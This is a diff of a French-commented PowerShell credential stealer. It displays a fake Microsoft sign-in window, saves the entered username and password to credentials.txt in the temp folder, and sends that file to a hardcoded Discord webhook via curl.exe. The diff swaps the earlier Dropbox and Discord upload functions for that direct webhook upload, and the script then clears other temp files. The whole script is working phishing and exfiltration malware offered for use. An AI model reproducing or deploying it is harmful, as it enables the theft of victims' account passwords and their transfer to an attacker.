@@ -1,4 +1,4 @@
-# Debut du script1
+# Debut du script
 $FileName = "credentials.txt"
 $filePath = "$env:TEMP\$FileName"
 
@@ -19,7 +19,6 @@ function Get-Creds {
     <Grid Background="#1F1F1F">
         <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="500">
             <!-- Logo Microsoft -->
-                        <!-- Logo Microsoft -->
             <StackPanel Orientation="Horizontal" Margin="0,0,0,40" VerticalAlignment="Top">
                 <Grid Width="40" Height="40" Margin="0,0,15,0">
                     <Grid.RowDefinitions>
@@ -177,32 +176,20 @@ $credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
 $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
 Write-Host "Fichier sauvegarde: $filePath" -ForegroundColor Green
 
-function DropBox-Upload {
-[CmdletBinding()]
-param ([Parameter (Mandatory = $True, ValueFromPipeline = $True)][Alias("f")][string]$SourceFilePath) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+#----------------------------------------------------------------------------------------------------
+# ENVOIE AU WEBHOOK DISCORD
+
+$hookurl = "https://discord.com/api/webhooks/1555535844650258512/6O0fSMEss7nXH5vIFFoDbLV-EpAXSx9QtjHPVmN6WbCESF6INDgxmmb5qBIy4FDJAf_W"
+
+try {
+    curl.exe -F "file=@$filePath" $hookurl
+    Write-Host "Fichier envoye a Discord avec succes" -ForegroundColor Green
+}
+catch {
+    Write-Host "Erreur lors de l'envoi a Discord: $_" -ForegroundColor Red
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $filePath}
-
-function Upload-Discord {
-[CmdletBinding()]
-param ([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text)
-$hookurl = "$dc"
-$Body = @{ 'username' = $env:username; 'content' = $text }
-if (-not ([string]::IsNullOrEmpty($text))){ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)}
-if (-not ([string]::IsNullOrEmpty($file))){ curl.exe -F "file1=@$file" $hookurl }
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $filePath}
+#----------------------------------------------------------------------------------------------------
 
 Get-ChildItem $env:TEMP -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -ne "credentials.txt" } | Remove-Item -Force -ErrorAction SilentlyContinue -Recurse
 
